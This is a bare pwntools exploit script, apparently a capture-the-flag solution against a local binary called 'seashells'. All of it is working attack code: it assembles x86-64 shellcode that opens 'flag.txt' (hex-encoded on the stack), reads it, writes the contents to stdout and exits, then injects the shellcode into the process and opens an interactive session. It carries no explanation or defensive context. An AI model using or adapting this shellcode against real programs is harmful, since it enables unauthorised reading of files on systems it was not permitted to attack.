from pwn import *

p = process('./seashells')

context.arch = 'amd64'

shellcode = asm('''
    xor rax, rax
    push rax
    movabs rbx,0x7478742e67616c66
    push rbx
    mov rdi,rsp
    xor rsi,rsi
    xor rdx,rdx
    mov rax, 2
    syscall

    mov rdi,rax
    sub rsp,0x100
    xor rax,rax
    mov rsi,rsp
    mov rdx,100
    syscall

    mov rdx,rax
    mov rax,1
    mov rdi,1
    mov rsi,rsp
    syscall

    mov rax,60
    xor rdi,rdi
    syscall
''')
p.send(shellcode)
p.interactive()
